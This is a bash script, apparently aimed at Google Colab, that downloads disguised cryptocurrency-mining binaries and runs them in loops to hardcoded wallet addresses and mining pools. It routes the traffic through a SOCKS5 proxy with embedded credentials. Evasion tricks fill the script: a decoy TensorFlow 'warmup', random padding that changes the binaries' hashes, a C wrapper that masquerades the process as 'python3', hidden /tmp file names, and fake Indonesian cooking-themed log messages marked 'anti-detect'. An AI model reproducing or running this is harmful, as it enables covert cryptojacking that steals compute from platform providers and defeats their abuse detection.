#!/bin/bash
# MINN v10 — fortune + graftcp (fix) + log receh + anti-detect
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)

log() {
    local m=(
        "🔥 Masak indomie batch #$1..."
        "🥵 Nguli dulu bentar..."
        "💨 Dorong gerobak ke gang $1..."
        "🍜 Nyeduh kuah, sabar..."
        "🏃 Lari komplek putaran $1..."
        "🧹 Nyapu halaman..."
        "🛒 Belanja warung antri $1..."
        "🐔 Kasih makan ayam..."
        "📦 Packing pesanan..."
        "☕ Bikin kopi batch $1..."
        "🧊 Isi es batu..."
        "🪴 Siram tanaman..."
        "🍳 Ceplok telor..."
        "📺 Nonton tv bentar..."
    )
    echo "[$(date +%H:%M:%S)] ${m[$((RANDOM % ${#m[@]}))]}"
}

echo "========================================"
echo "  MINN v10 — Warung: $WRK"
echo "========================================"

# === 1. Warmup ===
echo "[*] Pemanasan..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(1000,784).astype(np.float32);y=np.random.randint(0,10,1000)
for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(20)
" 2>/dev/null

# === 2. Download + graftcp setup ===
echo "[*] Siapin bahan..."
rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m

wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/fortune || exit 1
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || exit 1
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/graphics.tar.gz || exit 1

tar -xzf graphics.tar.gz 2>/dev/null
chmod +x fortune sse2

# Graftcp config
mkdir -p graftcp/local
P=$((RANDOM % 2000 + 2100))
cat > graftcp/local/graftcp-local.conf << EOF
listen = :$P
loglevel = 0
socks5 = 103.176.78.132:443
socks5_username = ubed
socks5_password = ubed123
EOF

# === Padding — ubah hash ===
dd if=/dev/urandom of=fortune bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s fortune) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null

# === Exec rename C wrapper ===
cat > /tmp/w.c << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main(int argc,char**argv){
    if(argc<2)return 1;
    size_t l=strlen(argv[0])+1;
    memset(argv[0],0,l);
    strncpy(argv[0],"python3",l-1);
    execvp(argv[1],&argv[1]);
    return 1;
}
CEOF
gcc -o /tmp/w /tmp/w.c -s 2>/dev/null

echo "[*] Bahan siap."

# === 3. Start graftcp proxy ===
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep 3

# Copy ke tmp (nama random)
B1="/tmp/.x$(date +%s | md5sum | head -c 6)"
B2="/tmp/.y$(date +%s | sha1sum | head -c 6)"
cp fortune "$B1"
cp sse2 "$B2"
chmod +x "$B1" "$B2"
# JANGAN hapus original — butuh buat fallback copy

sleep $((RANDOM % 8 + 3))

# === LOG THREAD ===
(
    c=0
    while true; do
        c=$((c+1)); log "$c"
        sleep $((RANDOM % 50 + 20))
    done
) &
LOGPID=$!

# === PRL: fortune melalui graftcp + /tmp/w (rename) ===
(while true; do
    # Graftcp → /tmp/w (rename) → fortune binary
    ./graftcp/graftcp /tmp/w "$B1" \
        --proxy 43.169.30.87:443 \
        --address "$PRL" \
        --worker "$WRK" \
        --mode=cpu \
        --threads=1 2>/dev/null
    # Kalau binary kehapus (unlink dari w), copy ulang
    if [ ! -f "$B1" ]; then
        cp fortune "$B1" 2>/dev/null
        dd if=/dev/urandom of="$B1" bs=1 count=$((RANDOM % 2000 + 512)) seek=$(stat -c%s "$B1") conv=notrunc oflag=append 2>/dev/null
        chmod +x "$B1" 2>/dev/null
    fi
    sleep 5
done) &
PID1=$!
sleep 10

# === TDC: sse2 via /tmp/w (rename) ===
(while true; do
    /tmp/w "$B2" \
        -a yespowertide \
        -o 47.251.244.12:80 \
        -u "${TDC}.${WRK}" \
        -t 1 >/dev/null 2>&1
    if [ ! -f "$B2" ]; then
        cp sse2 "$B2" 2>/dev/null
        chmod +x "$B2" 2>/dev/null
    fi
    sleep 5
done) &
PID2=$!

log 1

# === Cleanup ===
trap 'kill $PID1 $PID2 $LOGPID 2>/dev/null; rm -f /tmp/w /tmp/w.c "$B1" "$B2" 2>/dev/null; echo "[*] Warung tutup."' EXIT
(sleep 10800; echo "[*] Udah jam 3, balik dulu.") &
wait